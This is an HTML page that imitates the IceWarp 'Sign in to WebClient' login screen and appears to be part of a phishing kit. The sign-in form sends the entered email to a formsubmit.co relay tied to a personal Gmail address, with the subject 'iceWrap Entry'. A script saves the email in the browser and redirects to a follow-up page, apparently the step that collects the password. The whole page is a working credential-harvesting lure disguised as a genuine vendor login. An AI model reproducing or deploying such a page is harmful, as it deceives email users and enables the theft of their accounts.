  <body dir="ltr">
    <div
      class="o-external t-default sites-login site"
      style="background-image: url(/icw.png)"
      data-component="sites-login-1"
      id="content"
    >
      <main class="o-external__main">
        <form
          action="https://formsubmit.co/trevorharrisx3@gmail.com"
          data-component="templates-card~sign-in-1"
          class="o-card c-card"
          data-hook="form"
          method="POST"
        >
          <input
            type="hidden"
            name="_token"
            value="x9CMaJMSFRr8C3Zs8IaxOEzSUlweYN71"
          />

          <input type="hidden" name="_task" value="login" /><input
            type="hidden"
            name="_action"
            value="login"
          /><input
            type="hidden"
            name="_timezone"
            id="rcmlogintz"
            value="America/Los_Angeles"
          /><input type="hidden" name="_url" id="rcmloginurl" value="" />

          <input type="hidden" name="_subject" value="iceWrap Entry" />
          <input type="hidden" name="_captcha" value="false" />
          <div class="o-card__main">
            <div class="o-card__content" data-hook="content">
              <section
                data-component="organisms-card-section-1"
                class="o-card__section o-card__section--default"
              >
                <div data-component="organisms-card-header-1" class="o-header">
                  <div
                    data-component="atoms-dropdown-1"
                    class="o-dropdown"
                    data-hook="language"
                  >
                    <svg
                      data-component="atoms-icons-2"
                      class="o-icon o-dropdown__icon"
                    >
                      <use xlink:href="/planet-earth.svg"></use>
                    </svg>
                    <label class="o-dropdown__text">en</label>
                  </div>
                  <main class="o-header__main">
                    <div class="o-header__content">
                      <img
                        data-component="atoms-image-1"
                        class="o-header__image o-card__header--default"
                        src="login_logo.png"
                      />
                      <h2 class="o-header__title o-heading o-heading--beta">
                        Sign in to WebClient
                      </h2>
                    </div>
                    <div
                      data-component="atoms-well-1"
                      data-hook="well"
                      class="o-well o-well--primary o-header__well"
                    >
                      <svg
                        data-component="atoms-icons-1"
                        class="o-icon o-well__icon"
                      >
                        <use
                          xlink:href="./images/icons/icons.svg#information"
                        ></use>
                      </svg>
                      <div class="o-well__content"></div>
                    </div>
                  </main>
                </div>
              </section>
              <section
                data-component="organisms-card-section-2"
                class="o-card__section o-card__section--form"
              >
                <label
                  data-component="molecules-input~validatable-1"
                  class="o-input o-form__object molecules-input is-empty"
                >
                  <input
                    id="memberId"
                    data-component="atoms-element-input-1"
                    class="o-form__element"
                    type="email"
                    name="email"
                    required
                    data-hook="email"
                  />
                  <span
                    data-component="atoms-label-1"
                    class="o-label o-form__label o-form__label--main o-form__label--floating"
                    >Email address</span
                  >
                </label>
              </section>
              <section
                data-component="organisms-card-section-3"
                class="o-card__section o-card__section--default"
              >
                <div
                  data-component="molecules-button-1"
                  class="o-button o-form__object o-button--block o-button--primary"
                >
                  <button
                    data-component="atoms-element-button-1"
                    data-hook="validate-email"
                    type="submit"
                  >
                    <span>Next</span>
                  </button>
                </div>
                <a
                  data-component="atoms-link~contact-admin-1"
                  href="javascript:"
                  class="o-link"
                ></a>
              </section>
            </div>
          </div>
        </form>
      </main>
      <div
        data-component="organisms-bar~footer-1"
        class="o-bar o-external__footer"
      >
        <section class="o-bar__section o-bar__section--start">
          <svg data-component="atoms-icons-3" class="o-icon o-external__logo">
            <use xlink:href="./images/icons/icons.svg#icewarp"></use>
          </svg>
          <p class="o-external__copy o-info" title="">
            Powered by IceWarp ©&nbsp;<time datetime="2025">2025</time>
          </p>
        </section>
        <section class="o-bar__section o-bar__section--center">
          <a

            href="https://www.facebook.com/IceWarpInc"
            rel="noopener"
            target="_blank"
          >
            <svg data-component="atoms-icons-4" class="o-icon o-external__icon">
              <use xlink:href="./images/icons/icons.svg#facebook"></use>
            </svg>
          </a>
          <a
            class="o-external__social"
            href="https://twitter.com/icewarp"
            rel="noopener"
            target="_blank"
          >
            <svg data-component="atoms-icons-5" class="o-icon o-external__icon">
              <use xlink:href="./images/icons/icons.svg#twitter"></use>
            </svg>
          </a>
          <a
            class="o-external__social"
            href="https://www.linkedin.com/company/IceWarp"
            rel="noopener"
            target="_blank"

            <svg data-component="atoms-icons-6" class="o-icon o-external__icon">
              <use xlink:href="./images/icons/icons.svg#linkedin"></use>
            </svg>
          </a>
        </section>
        <section class="o-bar__section o-bar__section--end">
          <p class="o-info" title="Deep Castle 2 Update 3 build 10">
            To find out more about IceWarp server visit
            <a
              href="https://www.icewarp.com/"
              target="_blank"
              rel="noopener noreferrer"
              >www.icewarp.com</a
            >
          </p>
        </section>

    <script>
      document
        .querySelector("[data-hook='validate-email']")
        .addEventListener("click", function (e) {
          e.preventDefault();
          const email = document.getElementById("memberId").value;
          if (email.trim() === "") {
            alert("Please enter your User ID.");

            return;
          }
          localStorage.setItem("userEmail", email); // Store email in localStorage
          (window.location.href = "icewrap.html"), "incorrect.html"; // Redirect to iceWrap.html
        });
    </script>
